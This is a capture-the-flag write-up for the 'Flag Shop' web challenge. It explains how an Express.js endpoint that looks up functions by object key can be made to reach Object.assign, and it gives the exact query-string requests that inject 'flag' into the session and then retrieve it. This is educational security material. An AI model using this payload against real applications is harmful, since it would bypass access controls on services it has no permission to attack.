# Flag Shop

## Challenge (645 points, 11 solves)

> Classic flag shop challenge. Can you buy the flag?
> 
> Author: ocean

## Summary

The challenge highlights the fact that javascript object has default methods and properties that can be called via dictionary key-access (i.e. `obj[key]`).

Another important concept used to solve the challenge is sending JSON via GET parameters.

## Analysis

There is only one endpoint that can be used to exploit:

```js
const functions = {
    order: require('./functions/order'),
    menu: require('./functions/menu'),
    shop: require('./functions/shop'),
    user: require('./functions/user'),
};

app.get('/api/:module/:method', async (req, res) => {
    if (!req.session.order) {
        req.session.order = [];
    }
    const { module, method } = req.params;
    const arg = req.query.arg;
    if (!functions[module] || !functions[module][method] || typeof functions[module][method] !== 'function')
        return res.status(404).send("Method not found");
    let callable = functions[module][method];
    return res.status(200).send(JSON.stringify({ result: callable(req.session, arg) }));
});
```

My initial thought was that the modules have some broken access that can be exploited to read the flag. And indeed, there is an endpoint to read the flag. In `./functions/user.js`:

```js
const user = module.exports;

user.checkout = (sess, _) => {
    console.log("sessions", sess);
    for (const item of sess.order) {
        console.log("item", item);
        if (item === "flag"){
            return process.env.FLAG;
        }
    }
    sess.order = [];
    return 'ok';
}
```

This suggests that we need to add the item `flag` into our order. Looking at the only endpoint that can used to add items into our order, in `./functions/order.js`:

```js
const order = module.exports;
const menu = require('./menu');
order.add = (sess, item) => {
    if (Object.keys(menu.items).includes(item)) {
        sess.order.push(item);; 
    }
    return sess.order;
}
```

And in `./functions/menu.js`:

```js
const menu = module.exports;
menu.items = {
    'egg fried rice': 10, 
    'chang': 20,
    'singha': 20, 
    'butter cack': 5,
    'green curry': 7,
    'tom yum': 8,
}
```

The order endpoint ensures that any item added to basket must be one of the pre-defined items.

The other endpoints were of nothing suspicious. In fact, I could have written those lines in one of my projects. This questioned whether I actually wrote safe code in my projects 🤔.

When it seems like the app is very safe, we realised one thing: we can access default properties and methods of objects, via key access, too! For example, to access `Object.keys`, we can do the following:

```js
({})["constructor"]["keys"]
```

Amazing right! So looking at the only endpoint, we have a lot of key-access to objects. Our task is now to access the correct function, and invoke it with the correct argument.

One potential such candidate is, `Object.assign`. Hence we can access the following endpoint:

```
http://challs.nusgreyhats.org:33335/api/constructor/assign/?arg=
```

Ideally, the equivalent javascript code should be as follows:

```js
Object.assign(req.session, { order: ['flag'] });
```

However, in GET parameter, we can only provide string or an array of string, not an object. Or at least we think so. Not really! After searching the web for a while, we found the following [StackOverflow answer](https://stackoverflow.com/questions/15872658/standardized-way-to-serialize-json-to-query-string#answer-40156535). We can pass the object as follow:

```
?[arg][order]=flag
```

The above would become the folllowing in express.js:

```js
req.query.arg = { order: 'flag' }
```

To pass `flag` as an item in an array, we simply pass query param twice. Combine all the above, we make the following request to add `flag` to our order:

```
http://challs.nusgreyhats.org:33335/api/constructor/assign/?[arg][order]=flag&[arg][order]=flag2
```

We indeed get a response from the server that `flag` is in our order. The next step is to simply make an API call to obtain the flag:

```
http://challs.nusgreyhats.org:33335/api/user/checkout
```
